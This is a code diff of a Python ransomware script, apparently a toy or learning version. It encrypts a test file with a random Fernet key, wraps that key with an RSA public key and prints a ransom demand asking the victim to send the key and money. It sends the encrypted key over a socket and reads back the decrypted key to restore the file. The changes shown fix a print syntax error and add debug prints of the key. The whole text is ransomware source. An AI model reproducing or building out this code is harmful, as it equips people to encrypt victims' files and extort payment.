@@ -1,5 +1,4 @@
 import os
-from cryptography import x509
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -20,6 +19,7 @@ public_key = load_pem_public_key(pem_data, backend=default_backend())
 
 # step 2
 random_key = Fernet.generate_key()
+print('random key is: ', random_key)
 input_file = 'test.txt'
 output_file = 'test.encrypted'
 
@@ -52,7 +52,7 @@ else:
 
 
 # step 6
-print('Your key is %s' random_key_encrypted)
+print('Your key is %s', random_key_encrypted)
 print('Send this key and some money to me to get your data back')
 
 
@@ -65,6 +65,8 @@ s.sendall(random_key_encrypted) # how does this semd? all at once or in chunks
 
 # step 9 
 random_key = s.recv(2048)
+print(type(random_key))
+print('random key is: ', random_key)
 
 # step 10 
 with open(output_file, 'rb') as f:
